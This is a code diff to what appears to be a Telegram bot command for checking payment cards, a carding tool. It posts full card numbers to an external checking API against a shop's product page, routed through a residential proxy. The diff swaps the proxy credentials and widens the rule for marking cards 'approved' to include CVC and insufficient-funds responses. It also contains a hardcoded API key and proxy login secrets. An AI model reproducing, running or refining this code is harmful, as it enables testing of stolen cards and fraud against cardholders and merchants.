@@ -71,14 +71,14 @@ async def cmd_sh(client, message):
 
         tic = time.perf_counter()
 
-        async with httpx.AsyncClient(timeout=20) as http_client:
+        async with httpx.AsyncClient(timeout=30) as http_client:
             payload = {
                 "key": "VDX-SHA2X-NZ0RS-O7HAM",
                 "data": {
                     "card": fullcc,
                     "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
                     "email": None,
-                    "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t",
+                    "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                     "ship_address": None,
                     "is_shippable": False
                 }
@@ -89,7 +89,7 @@ async def cmd_sh(client, message):
                 response = res.json()
                 msg_raw = response.get("message") or response.get("error") or "No response"
                 msg_check = msg_raw.lower()
-                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "charged"]) else "declined"
+                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient" , "charged"]) else "declined"
                 card_message = msg_raw
             except Exception as e:
                 card_status = "error"
